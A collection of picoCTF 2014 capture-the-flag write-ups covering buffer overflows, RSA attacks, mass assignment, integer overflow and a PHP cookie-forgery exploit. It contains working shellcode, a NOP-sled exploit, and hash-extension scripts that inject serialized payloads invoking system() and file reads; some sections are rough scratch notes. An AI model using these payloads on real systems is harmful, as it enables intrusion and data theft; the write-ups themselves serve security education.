|                                        |                                                         
+----------------------------------------+                                                         
                                                                                                   
                                                                                                   
                                                                                                   
                                                                                                   
Please login to continue...                                                                        
                                                                                                   
                                                                                                   
Username (max 15 characters): aaaabbbbccccdddd                                                     
Password (max 31 characters): a                                                                    
Your access level is: 0x00000020                                                                   
Admin access granted!                                                                              
The flag is in "flag.txt".                                                                         
$ cat flag.txt                                                                                     
8b7ea70220f19ab662750a8710a552c4                                                                   
```
Note: username was ```"aaaabbbbccccdddd "``` (with a space at the end)



### File: writeups/picoctf_2014/crudecrypt/README.md

**Name**: CrudeCrypt  
**Points**: 180  
**Type**: Binary Exploitation  
**Description**:  
Without proper maintainers, development of [Truecrypt](http://truecrypt.sourceforge.net/) has stopped! CrudeCrypt has emerged as a notable alternative in the open source community. The author has promised it is 'secure' but we know better than that. Take a look at the [code](https://picoctf.com/problem-static/binary/CrudeCrypt/crude_crypt.c) and read the contents of `flag.txt` from the server! The problem is at `/home/crudecrypt/crude_crypt` on the shell server.  
**Hint**:  
You can never trust user input!  
**Files**: crude_crypt.c

*****
# Code review

Here is what the relevant functions do:

##### main
- check if there are 3 arguments
- check if 1st argument is "encrypt" or "decrypt", and assign action function pointer
- if encrypt, setegid()
- open 2nd and 3rd argument as files
- read out file_password from stdin (max 128 bytes; possibly not null terminated)
- digest = MD5(password)
- call action(infile, outfile, digest)
- cleanup + exit

##### decrypt_file
- get file size of infile (using fstats)
- calloc buffer of that size
- copy contents of infile to buffer
- try decrypt_buffer (this function should work as intended)  
  - if fail, return
- create file_header based on decrypted data; we can put whatever we want in the header!
- check if magic number is correct  
  - if not, return
- call check_hostname  
  - print error message if it doesn't match
- write_size = MIN(header->file_size, infile size - header size); possible signed/unsigned bug!
- write decrypted data to outfile

##### check_hostname
- unsafe strncpy from header->host to stack buffer of size 32
- call safe_gethostname
- return after calling strcmp

```C
bool check_hostname(file_header* header) {
    char saved_host[HOST_LEN], current_host[HOST_LEN];
    strncpy(saved_host, header->host, strlen(header->host));
    safe_gethostname(current_host, HOST_LEN);
    return strcmp(saved_host, current_host) == 0;
}
```

*****
# Exploitation

The bug we are going to exploit is in the function check_hostname. The strncpy is used unsafely, because it is being told to copy the contents from src to dest (for the length of **src**). A safe usage would copy the contents from src to dest (for the length of **dest**)! Using strncpy in this way is the same as using strcpy, which is unsafe if src is provided by the user. By copying a src string that is larger than dest, we can cause a stack overflow which we can use to overwrite eip.

We can exploit this, because after the decryption of the infile, the header is created based on the decrypted data without any checks. This means we control whatever is in the header struct. This includes host, which is usally a 32-byte, null-terminated string. By removing the null bytes at the end, we can increase the length of the host string to cause the stack overflow.

In order to verify if this bug works, we will try to encrypt a file full of "a"s, but right before the call to encrypt the data, we will tamper with the header. This will result in an encrypted file that will result in a SEGFAULT when decrypted. I will use password "a", but it doesn't really matter.

##### Testing the exploit:
```
$ cp -r /home/crudecrypt/ /tmp/delilled
$ cd /tmp/delilled/crudecrypt
$ python -c 'print "a"*100' > a_file
$ <use gdb to read a_file, overwrite any null characters in host, and store the result in enc_file>
$ ulimit -c unlimited
$ ./crude_crypt decrypt enc_file dec_file
-> File password: a
Segmentation fault (core dumped)
$ gdb -q crude_crypt core 
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x61616161 in ?? ()
```

Ok, so we know we have control of eip and the stack. After checking that the stack is executable ($ readelf crude_crypt -a | grep GNU_STACK), which it is, we will place nop slide + shellcode in our input and overwrite eip with the address of the middle of the nop slide.

Using gdb, we can determine that the host variable is located at `0xffffd5c0` and the return address is located at `0xffffd60c`. If we provide a reasonable nop sled (32 bytes), this should bring the address of the middle of the nop sled to `0xffffd64c`. It doesn't really matter what we use to fill the host variable before encryption, as long as there are no string terminators (I will be using "a"s). For fault tolerance, I will also be repeating the sled address 8 times, because the return address is located 4 bytes from where the data starts.

##### The structure of the exploit data will be:
`(sled address)*8 + (\x90)*128 + shellcode`

##### Shellcode:
`\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`

##### Executing the exploit:
```bash
$ python -c 'print "\x4c\xd6\xff\xff"*8 + "\x90"*128 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"' > exploit_data
$ <use gdb to read exploit_data, overwrite any null characters in host, and store the result in exp_file>
$ cd /home/crude_crypt
$ ./crude_crypt decrypt /tmp/delilled/crudecrypt/exp_file /tmp/delilled/crudecrypt/dec_file
-> File password: a
$ cat flag.txt
writing_software_is_hard
```

If you're having trouble with landing on the nop sled, you can push it around by changing the arguments. Since the 3<sup>rd</sup> argument (outfile) doesn't matter, as long as it can be opened, you could try playing with this. Alternatively, you could create a bigger nop sled. I just got lucked that it worked right away, but I had trouble running it my tmp directory.

*****
References:
- [stat struct](http://codewiki.wikidot.com/c:struct-stat)
- [fstat](http://linux.die.net/man/2/fstat)
- [mcrypt library](http://mcrypt.hellug.gr/lib/mcrypt.3.html)


### File: writeups/picoctf_2014/fancy_cache/README.md

**Name**: Fancy Cache  
**Type**: Master Challenge 
**Points**: 200   
**Description**:  
Margaret wrote a fancy in-memory cache server. For extra security, she made a custom string structure that keeps strings on the heap. However, it looks like she was a little sloppy with her mallocs and frees. Can you find and exploit a bug to get a shell?
You can connect to the server at `vuln2014.picoctf.com:4548`
The following exploit mitigations are enabled on the server:
- ASLR: This means the stack, heap, and libc addresses are randomized. However, the locations of code and data inside the binary is not randomized.
- NX: No memory is every simultaneously writable and executable. This means that you cannot just write shellcode somewhere and get the program to jump to it.

Here's the info (don't worry about the libc file for now): [source code](https://picoctf.com/problem-static/binary/fancy_cache/fancy_cache.c), [binary](https://picoctf.com/problem-static/binary/fancy_cache/fancy_cache), [libc](https://picoctf.com/problem-static/binary/fancy_cache/libc.so.6)

P.S. We found a client for the server: [client.py](https://picoctf.com/problem-static/binary/fancy_cache/client.py)  
**Hint**:  
Is there any way that the server might try to use a struct string after it has been freed? Perhaps we can put something else in the freed memory. For similarly sized allocations, malloc often returns a recently freed address.

The offset of memcmp in libc is 0x142870. This is different than what objdump says because libc chooses a different memcmp implementaton depending on what features the processor supports.  
**Files**: `fancy_cache`, `fancy_cache.c`, `libc.co.6`, `client.py`

*****

nc vuln2014.picoctf.com 4548

Note: length of message has to fit inside 32-bit unisgned integer (or else problem when calling write_string)

gcc -g -m32 -o fancy fancy_cache.c
gcc -g -m32 -o echo echo.c

/msg nickserv register

F4b4vFgICW#q7eT7s4LH





cat in &
cat > out &
./echo <in >out &
nc -l -p 4548 <out >in


lsof -Pni | grep LISTEN


gdb fancy_cache
set disassembly-flavor intel
run <in >out



### File: writeups/picoctf_2014/low_entropy/README.md

For this challenge, we get a packet capture and a service running at vuln2014.picoctf.com:51818.

The packet capture is relatively simple and shows the spy sending an encrypted message to the dropbox. Using "Follow TCP stream", we get the public key that was used and the encrypted message (hex-encoded).

The service (for which we get the code) will generate a public key by multiplying two different primes from a pool of 30. By comparing different public keys, it is possible to determine the 30 primes in the pool. There are 435 different possible keys (30 choices for the first prime and 29 choices for the second prime, divided by 2 because the order doesn't matter). We don't need all of them; just enough so we have a good chance of each prime being used at least once. As long as we get more than 15 keys, we'll be able to find some primes.

So, the first thing we need to do is collect some keys. I gathered the 60 keys using the 'get_key.py' script (just a bunch of requests, extract the keys, and store the list in a file).

Next, we need to find the primes that created these keys. These keys are all of the form: p0*p1, p0*p2, ..., p1*p2, ..., p28*p29. So if we get 2 random keys, it's possible that they are both multiple of the same prime (e.g. p0*p1 and p0*p2). All we need to find p0, is to use the gcd algoritmh on these 2 numbers. If we do this for all possible plairs of our keys, we'll find all 30 primes (which will be saved to a file). See 'find_primes.py'.

Now that we have our primes, we can determine which primes were used for the public key in the packet capture. See 'dehexed.py'.

The last step is to use these 2 primes (p and q), together with the public exponent e (the service tells us this is 65537) to decode the message (as decode in the previous step). The only difficulty here is to find d, based on p, q, and e. For this we first need to calculate t (totient of p*q = (p-1)*(q-1)) and then find the multiplicative inverse of e mod t. In other words: find d, so that s*e mod t = 1. This is best done using the extended euclidian algorithm.
Once we have d, we can just apply the RSA decryption formula. Details in 'decode.py'.

Decode message: Good thing no one can read this! I'd hate for them to know that the flag is make_sure_your_rng_generates_lotsa_primes.


### File: writeups/picoctf_2014/massive_fail/README.md

A challenge involving Ruby on Rails, this time.

The hint tells us to look at 2 files: app/controllers/user_controller.rb and db/schema.rb

The first tells us that the script will just pass any parameters it receives to the db, and the second file tells us the database schema (= how the tables are made up).
Immediately after reading the schema, we can tell that the column "is_admin" is very important.

Let's try creating a new user and capturing the exchange with our favorite proxy, Burpsuite. It seems the parameters are simply passed in the body:
user%5Bname%5D=myname&user%5Busername%5D=myusername&user%5Bpassword%5D=mypassword&commit=Register

Since we know the script will accept any parameters, all we need to do is add another parameter, so that the new account has admin privileges. We need to add "user[is_admin]=true" to the parameters (URL-encoded of course):
user%5Bname%5D=myname&user%5Busername%5D=myusername&user%5Bpassword%5D=mypassword&user%5Bis%5Fadmin%5D=true&commit=Register

Success, we get our flag: no_framework_is_without_sin


### File: writeups/picoctf_2014/netsino/README.md

This is a source code review challenge, meaning we need to find a bug in the source code to exploit.

Because we know that the service is running on a remote host that we don't have a shell on, we know that any possible bugs have to be triggered by our input. Upon further inspection, we see that the only places we get to provide input, is through the getnum function (when entering a bet, or when making a choice). Since the choice is heavily checked ("1 <= choice && choice <= 5"), we won't be able to do anything with that. This only leaves messing with the bet input.

The function getnum uses a uint64_t datatype to store num. This then gets cast into a long in the function getbet. There is a check that compares num to LONG_MAX (which equals 2,147,483,647), but after this check passes, num is increased (multiplid by 10 and added the value of the last entered character). This means that is we tried to enter "2147483648\n", after entering the "8", num would still equal 214748364 (less than LONG_MAX), then num would be set to 2147483648, and the newline would cause this value to be returned.
In the function getbet, this value will be attempted to be cast into a long (which has max value of 2147483647 on this server; but that depends on the machine!). Instead we get an underflow and bet is set to the value -2147483648.

Funnily enough, if you pick choice 1, it won't matter if you win or lose. The goal is to get the boss' cash to 0 or less. Assuming the boss starts at 999999979 (=999999999-20):
WIN: he adds the bet of -2147483648 to his balance, which brings his new total to -1147483669
LOSE: he substracts the bet from his balance, which should bring his new total to 3147483627, but this causes an overflow (see note below), so he actually has -1147483667.

So either way you win!
Flag: i_wish_real_casinos_had_this_bug

Note: If a datatype has range [-(x+1), x], then applying an overflow is the same as subtracting 2*(x+1).
Example: x+1 causes an overflow and will be equal to (x+1)-2*(x+1) = -(x+1)


### File: writeups/picoctf_2014/rsa_mistakes/README.md

**Name**: RSA Mistakes  
**Points**: 200  
**Type**: Master Challenge  
**Description**:  
Daedalus Corp seems to have had a very weird way of broadcasting some secret data. [We managed to find the server code that broadcasted it, and one of our routers caught some of their traffic](https://picoctf.com/problem-static/crypto/rsa-mistakes/handout.zip) - can you find the secret data? We think someone may have requested the secret using someone else's user id by accident, but we're not sure.  
**Hint**:  
Two of these messages use the same public key, and are related in a useful way.  
**Files**: dump.pcap, server.py

*****
# Network capture analysis

Wireshark filter:  
tcp contains "Welcome"  
(7 results)

##### Follow TCP stream 1
Welcome to the Daedalus Corp Message Service  
Please send me a public key and an ID. We'll encrypt the message and send it to you.
fd2adfc8f9e88d3f31941e82bef75f6f9afcbba4ba2fc19e71aab2bf5eb3dbbfb1ff3e84b6a4900f472cc9450205d2062fa6e532530938ffb9e144e4f9307d8a2ebd01ae578fd10699475491218709cfa0aa1bfbd7f2ebc5151ce9c7e7256f14915a52d235625342c7d052de0521341e00db5748bcad592b82423c556f1c1051 3 37  
0x81579ec88d73deaf602426946939f0339fed44be1b318305e1ab8d4d77a8e1dd7c67ea9cbac059ef06dd7bb91648314924d65165ec66065f4af96f7b4ce53f8edac10775e0d82660aa98ca62125699f7809dac8cf1fc8d44a09cc44f0d04ee318fb0015e5d7dcd7a23f6a5d3b1dbbdf8aab207245edf079d71c6ef5b3fc04416L

##### Follow TCP stream 2
Welcome to the Daedalus Corp Message Service  
Please send me a public key and an ID. We'll encrypt the message and send it to you.
fd2adfc8f9e88d3f31941e82bef75f6f9afcbba4ba2fc19e71aab2bf5eb3dbbfb1ff3e84b6a4900f472cc9450205d2062fa6e532530938ffb9e144e4f9307d8a2ebd01ae578fd10699475491218709cfa0aa1bfbd7f2ebc5151ce9c7e7256f14915a52d235625342c7d052de0521341e00db5748bcad592b82423c556f1c1051 3 52  
0x1348effb7ff42372122f372020b9b22c8e053e048c72258ba7a2606c82129d1688ae6e0df7d4fb97b1009e7a3215aca9089a4dfd6e81351d81b3f4e1b358504f024892302cd72f51000f1664b2de9578fbb284427b04ef0a38135751864541515eada61b4c72e57382cf901922094b3fe0b5ebbdbac16dc572c392f6c9fbd01eL

*****
# Decryption

The server.py file is pretty simple:
- print the welcome message
- read the user input
- extract the modulus, exponent, and user_id
- create message based on used_id
- encrypt the message
- send the encrypted message

##### Encryption of message
```python
encrypted = hex(pow(user_id * int(message.encode('hex'), 16) + (user_id**2), e, N))
```

##### Defining some values
```python
N = 0xfd2adfc8f9e88d3f31941e82bef75f6f9afcbba4ba2fc19e71aab2bf5eb3dbbfb1ff3e84b6a4900f472cc9450205d2062fa6e532530938ffb9e144e4f9307d8a2ebd01ae578fd10699475491218709cfa0aa1bfbd7f2ebc5151ce9c7e7256f14915a52d235625342c7d052de0521341e00db5748bcad592b82423c556f1c1051
e = 3
c1 = 0x81579ec88d73deaf602426946939f0339fed44be1b318305e1ab8d4d77a8e1dd7c67ea9cbac059ef06dd7bb91648314924d65165ec66065f4af96f7b4ce53f8edac10775e0d82660aa98ca62125699f7809dac8cf1fc8d44a09cc44f0d04ee318fb0015e5d7dcd7a23f6a5d3b1dbbdf8aab207245edf079d71c6ef5b3fc04416
c2 = 0x1348effb7ff42372122f372020b9b22c8e053e048c72258ba7a2606c82129d1688ae6e0df7d4fb97b1009e7a3215aca9089a4dfd6e81351d81b3f4e1b358504f024892302cd72f51000f1664b2de9578fbb284427b04ef0a38135751864541515eada61b4c72e57382cf901922094b3fe0b5ebbdbac16dc572c392f6c9fbd01e
i1 = 37
i2 = 52
```

We know that `c1 = (i1*m+i1²)³ mod N` and `c2 = (i2*m+i2²)³ mod N`. By using the modular multiplicative inverse of i1³ and i2³, we get the ciphertext corresponding to `m+i1` and `m+i2` : `c3 = c1*mult_inv(i1³) mod N = (m+i1)³ mod N` and `c4 = c2*mult_inv(i2³) mod N = (m+i2)³ mod N`. When decrypted, these messages are very similar; they differ only by a constant (15).

## Franklin-Reiter attack
We will now use the Franklin-Reiter/Coppersmith attack to abuse this to discover the plain text m. It works like this:  
```
a = (x)³ mod N
b = (x+d)³ mod N
==>
s = (b-a+2d³) mod N
t = d*(b+2a-d³) mod N
==>
x*s mod N = t mod N <=> 3xd³+3dx³+3x²d² mod N = 3xd³+3dx³+3x²d² mod N
==>
x = t*mult_inv(s) mod N
```
In English now:  
If we have 2 encrypted message that differ only by a constant factor (or more generally, by a 1<sup>st</sup>-degree polynomial), we can discover the plain text message by equations above (which is just simple modular arithmetic).
If we apply this attack to messages c3 and c4 (`a = c3`, `b = c4`, `d = 15`), we can find x (`x = m+i1`).

After executing `decrypt.py`, we find our flag: `did_you_know_you_can_sometimes_gcd_outside_a_euclidean_domain`

*****
# References
- [Coppersmith's attack](http://en.wikipedia.org/wiki/Coppersmith%27s_Attack)
- [Franklin-Reiter related message attack](http://en.wikipedia.org/wiki/Coppersmith%27s_Attack#Franklin-Reiter_Related_Message_Attack)
- [Paper by Don Coppersmith detailing this attack](https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf)
- [Paper containing several RSA attacks](http://thescipub.com/PDF/jcssp.2006.665.671.pdf)
- [Modular multiplicative inverse](http://en.wikipedia.org/wiki/Modular_multiplicative_inverse)
- [Extended Euclidian algorithm](http://en.wikipedia.org/wiki/Extended_Euclidean_algorithm)


### File: writeups/picoctf_2014/steves_list/README.md

**Name**: Steve's List  
**Points**: 200
**Type**: Master challenge  
**Description**:  
Section Chief Steve was super proud of the website he was writing, but he's pretty new to programming. When Daedalus Corp caught wind of this, they hacked [his site](http://steveslist.picoctf.com/). Steve still has [an old backup](https://picoctf.com/problem-static/web/steves-list/handout.zip), but they changed the secrets! They sent us a cryptic message saying they bet we couldn't read `/home/daedalus/flag.txt`. Can you go get it for us?  
**Hint**:  
Go have a look at the cookies. Steve is pretty sure he wrote a bug, and that Daedalus left the secret the same length.  
**Files**: handout.zip (contains a php project)

*****

2141b332222df459fd212440824a35e63d37ef69

custom_settings=b%253A1%253B
custom_settings_hash=28983bf51602066a652a2917211f654c415b71b6;

url-decoded: "b%3A1%3B"
twice: "b:1;"

DAEDALUS

84eb5787abec3d3501a6bb0e326086360b4b9086
28983bf51602066a652a2917211f654c415b71b6



index.php:
b%3A1%3B
2141b332222df459fd212440824a35e63d37ef69

cookies.php:
b%3A1%3B
28983bf51602066a652a2917211f654c415b71b6

sha1(AUTH_SECRETb:1;) = 28983bf51602066a652a2917211f654c415b71b6


*****
# var_dump hax.txt 

object(Post)#5 (3) {
  ["title":protected]=>
  string(22) "0wn3d by D43d4lu5 C0rp"
  ["text":protected]=>
  string(339) "OWNED OWNED OWNED OWNED OWNED OWNED SECTION CHIEF STEVE IS THE WORST[br][img]./daedalus.png[/img][br][script]alert(1);[/script][marquee]rekt[/marquee][br][br][blink]we changed your secret[/blink][br][br][marquee][blink]bet you'll never get control of this site back[/blink][/marquee][br][blink]look at this top quality tag we added[/blink]"
  ["filters":protected]=>
  array(5) {
    [0]=>
    object(Filter)#6 (2) {
      ["pattern":protected]=>
      string(29) "/\[script\](.*)\[\/script\]/i"
      ["repl":protected]=>
      string(19) "<script>\1</script>"
    }
    [1]=>
    object(Filter)#7 (2) {
      ["pattern":protected]=>
      string(32) "/\[marquee\](.*)\[\/marquee\]/iU"
      ["repl":protected]=>
      string(21) "<marquee>\1</marquee>"
    }
    [2]=>
    object(Filter)#8 (2) {
      ["pattern":protected]=>
      string(28) "/\[blink\](.*)\[\/blink\]/iU"
      ["repl":protected]=>
      string(17) "<blink>\1</blink>"
    }
    [3]=>
    object(Filter)#9 (2) {
      ["pattern":protected]=>
      string(23) "/\[img\](.*)\[\/img\]/i"
      ["repl":protected]=>
      string(14) "<img src='\1'>"
    }
    [4]=>
    object(Filter)#10 (2) {
      ["pattern":protected]=>
      string(9) "/\[br\]/i"
      ["repl":protected]=>
      string(4) "<br>"
    }
  }
}

*****
# var_dump steve.txt

object(Post)#5 (3) {
  ["title":protected]=>
  string(23) "I'm Section Chief Steve"
  ["text":protected]=>
  string(57) "I'm the best.[br]The very best.[br][img]./Steve.png[/img]"
  ["filters":protected]=>
  array(4) {
    [0]=>
    object(Filter)#6 (2) {
      ["pattern":protected]=>
      string(19) "/\[i\](.*)\[\/i\]/i"
      ["repl":protected]=>
      string(9) "<i>\1</i>"
    }
    [1]=>
    object(Filter)#7 (2) {
      ["pattern":protected]=>
      string(19) "/\[b\](.*)\[\/b\]/i"
      ["repl":protected]=>
      string(9) "<b>\1</b>"
    }
    [2]=>
    object(Filter)#8 (2) {
      ["pattern":protected]=>
      string(23) "/\[img\](.*)\[\/img\]/i"
      ["repl":protected]=>
      string(14) "<img src='\1'>"
    }
    [3]=>
    object(Filter)#9 (2) {
      ["pattern":protected]=>
      string(9) "/\[br\]/i"
      ["repl":protected]=>
      string(4) "<br>"
    }
  }
}

******

php -S 127.0.0.1:8888 -t test_php/

php -S 127.0.0.1:8888 -t steves_list_backup/


*****



######

<?php  
  require_once("classes.php");

  $myfilter = new Filter("/a/e", "file_get_contents('/root/test.txt')");
  $mypost = new Post("title", "a", array($myfilter));
  echo $mypost->display_post();
?>

string(195) "O:4:"Post":3:{s:8:"*title";s:5:"title";s:7:"*text";s:1:"a";s:10:"*filters";a:1:{i:0;O:6:"Filter":2:{s:10:"*pattern";s:4:"/a/e";s:7:"*repl";s:35:"file_get_contents('/root/test.txt')";}}}" 

Escape the double quotes + add /x00 on either side of the 5 asterisks:

O:4:\"Post\":3:{s:8:\"\x00*\x00title\";s:5:\"title\";s:7:\"\x00*\x00text\";s:1:\"a\";s:10:\"\x00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\x00*\x00pattern\";s:4:\"/a/e\";s:7:\"\x00*\x00repl\";s:35:\"file_get_contents('/root/test.txt')\";}}}

Verify that this works when unserializing locally.

######

import hashpumpy
import urllib

# Post object without filter (prints "<!-- POST title: a -->" at the bottom)
sig = "2141b332222df459fd212440824a35e63d37ef69"
data = "b:1;"
kl = 8
add = "\n" + "O:4:\"Post\":3:{s:8:\"\x00*\x00title\";s:5:\"title\";s:7:\"\x00*\x00text\";s:1:\"a\";s:10:\"\x00*\x00filters\";a:0:{}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'ccab5775f7dbbac3aff0808f1e678a149a08e70b'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A0%3A%7B%7D%7D'


# Post object with simple filter a->b (prints "<!-- POST title: b -->" at the bottom)
add = "\n" + "O:4:\"Post\":3:{s:8:\"\x00*\x00title\";s:5:\"title\";s:7:\"\x00*\x00text\";s:1:\"a\";s:10:\"\x00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\x00*\x00pattern\";s:4:\"/a/e\";s:7:\"\x00*\x00repl\";s:1:\"b\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

 c15852cee15169502158a75bf86c437e3bf7187e
'c15852cee15169502158a75bf86c437e3bf7187e'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A1%3A%22b%22%3B%7D%7D%7D'

b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A1%3A%22b%22%3B%7D%7D%7D


# Post object with complex filter (/root/test.txt); only test locally
add = "\n" + "O:4:\"Post\":3:{s:8:\"\x00*\x00title\";s:5:\"title\";s:7:\"\x00*\x00text\";s:1:\"a\";s:10:\"\x00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\x00*\x00pattern\";s:4:\"/a/e\";s:7:\"\x00*\x00repl\";s:35:\"file_get_contents('/root/test.txt')\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'ecc4ed0ae8118a4fb80c879086d6dd1731469377'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A35%3A%22file_get_contents%28%27%2Froot%2Ftest.txt%27%29%22%3B%7D%7D%7D'

# Post object with complex filter (/home/daedalus/flag.txt)
add = "\n" + "O:4:\"Post\":3:{s:8:\"\00*\x00title\";s:5:\"title\";s:7:\"\00*\x00text\";s:1:\"a\";s:10:\"\00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\00*\x00pattern\";s:4:\"/a/e\";s:7:\"\00*\x00repl\";s:44:\"file_get_contents('/home/daedalus/flag.txt')\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'af6a34f1325d5d4e611a1eca4295a1fba7b1f5c9'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A44%3A%22file_get_contents%28%27%2Fhome%2Fdaedalus%2Fflag.txt%27%29%22%3B%7D%7D%7D'

# Post object with complex filter (index.php)
add = "\n" + "O:4:\"Post\":3:{s:8:\"\00*\x00title\";s:5:\"title\";s:7:\"\00*\x00text\";s:1:\"a\";s:10:\"\00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\00*\x00pattern\";s:4:\"/a/e\";s:7:\"\00*\x00repl\";s:30:\"file_get_contents('index.php')\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'c7aca860b5608beee1705109be2d03f6804eed04'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A30%3A%22file_get_contents%28%27index.php%27%29%22%3B%7D%7D%7D'

# Post object with complex filter (system pwd)
add = "\n" + "O:4:\"Post\":3:{s:8:\"\00*\x00title\";s:5:\"title\";s:7:\"\00*\x00text\";s:1:\"a\";s:10:\"\00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\00*\x00pattern\";s:4:\"/a/e\";s:7:\"\00*\x00repl\";s:11:\"system(pwd)\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'14df21bc7fd2f277a9b1ba1225444af6dcd1e345'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A11%3A%22system%28pwd%29%22%3B%7D%7D%7D'

# Post object with complex filter (system ls)
add = "\n" + "O:4:\"Post\":3:{s:8:\"\00*\x00title\";s:5:\"title\";s:7:\"\00*\x00text\";s:1:\"a\";s:10:\"\00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\00*\x00pattern\";s:4:\"/a/e\";s:7:\"\00*\x00repl\";s:10:\"system(ls)\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'3d793481e67b34f5f08198790cd26957d083a79e'
